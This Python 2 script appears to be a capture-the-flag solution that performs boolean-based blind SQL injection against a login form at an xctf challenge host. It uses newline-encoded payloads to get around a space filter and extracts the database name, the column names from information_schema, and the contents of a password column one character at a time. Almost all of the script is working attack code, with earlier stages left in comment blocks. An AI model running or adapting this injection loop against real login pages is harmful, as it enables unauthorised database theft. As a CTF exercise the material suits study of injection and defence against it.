# coding: utf-8
import sys
import urllib

import requests

reload(sys)
sys.setdefaultencoding('utf8')

s = requests.session()
url = 'http://challenges.xctf.org.cn:8003/login.php'
length = 0
chars = "s,pgabmrcdefhijklnopqstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789(){}"

database = ''
flag = ''

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://challenges.xctf.org.cn:8003/login.php'
}
'''
for i in xrange(3, 15):
    payload = "admin'%%0aand%%0a(select%%0alength(database()))=%s#" %i
    data = {
        'username': urllib.unquote(payload),
        'password': '1',
        'submit': ''
    }
    r = s.post(url, data=data)
    if "成功" in r.text:
        length = i
        print "database length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "admin'%%0aand%%0a(select%%0aascii(substring(database()%%0afrom%%0a%s%%0afor%%0a1)))=%s#" %(i, ord(j))
        data = {
            'username': urllib.unquote(payload),
            'password': '1',
            'submit': ''
        }
        r = s.post(url, data=data)
        #print r.text
        #print data
        #print "now in %s,%s"%(i,j)
        if "成功" in r.text:
            database += j
            print "database is %s" % database
            break
'''

# database:xman
# table:ctf_users, 0x68316464656e5f66313467
'''
for i in xrange(19, 22):
    payload = "admin'%%0aand%%0a(select%%0alength(group_concat(COLUMN_NAME))%%0afrom%%0ainformation_schema.COLUMNS%%0awhere%%0aTABLE_NAME=0x6374665f7573657273)=%s#" %i
    data = {
        'username': urllib.unquote(payload),
        'password': '1',
        'submit': ''
    }
    r = s.post(url, data=data)
    #print r.text
    if "成功" in r.text:
        length = i
        #print r.text
        print "column length is %s" % i
        #print "payload is %s" % payload
        break
'''
'''
flag = 'id,rname,gpa'
for i in range(13, 21):
    for j in chars:
        payload = "admin'%%0aand%%0a(select%%0aascii(substring(group_concat(COLUMN_NAME)%%0afrom%%0a%s%%0afor%%0a1))%%0afrom%%0ainformation_schema.COLUMNS%%0awhere%%0aTABLE_NAME=0x6374665f7573657273)=%s#"%(i, ord(j))
        #print payload
        data = {
            'username': urllib.unquote(payload),
            'password': '1',
            'submit': ''
        }
        r = s.post(url, data=data)
        #print payload
        #print r.text
        if "成功" in r.text:
            flag += j
            print "payload is %s"%payload
            print "column is %s" %flag
            break
'''
# column the_f14g

'''
for i in xrange(50, 100):
    payload = "admin'%%0aand%%0a(select%%0alength(group_concat(gpass))%%0afrom%%0actf_users)=%s#" %i
    data = {
        'username': urllib.unquote(payload),
        'password': '1',
        'submit': ''
    }
    r = s.post(url, data=data)
    #print r.text
    if "成功" in r.text:
        length = i
        # print r.text
        print "flag length is %s" % i
        # print "payload is %s" % payload
        break
'''
# flag length=50

flag = 'admin,WE1BTntET195b3VfbDFrZV9zcWxtYXBfc3FsbWFwfQ'
for i in range(50, 60):
    for j in chars:
        payload = "admin'%%0aand%%0a(select%%0aascii(substring(group_concat(gpass)%%0afrom%%0a%s%%0afor%%0a1))%%0afrom%%0actf_users)=%s#" % (
        i, ord(j))
        data = {
            'username': urllib.unquote(payload),
            'password': '1',
            'submit': ''
        }
        r = s.post(url, data=data)
        # print payload
        # print r.text
        if "成功" in r.text:
            flag += j
            print "payload is %s" % payload
            print "flag is %s" % flag
            break
